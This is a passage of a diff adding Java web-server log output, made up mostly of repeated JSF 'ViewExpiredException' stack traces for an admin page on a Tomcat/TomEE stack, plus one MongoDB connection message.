+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 21:30:55.144 SEVERE [http-nio-8080-exec-1] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 21:30:56.981 SEVERE [http-nio-8080-exec-7] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 21:31:03.093 SEVERE [http-nio-8080-exec-6] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 21:35:29.681 INFO [http-nio-8080-exec-4] com.mongodb.diagnostics.logging.SLF4JLogger.info Opened connection [connectionId{localValue:4, serverValue:5385}] to localhost:27017
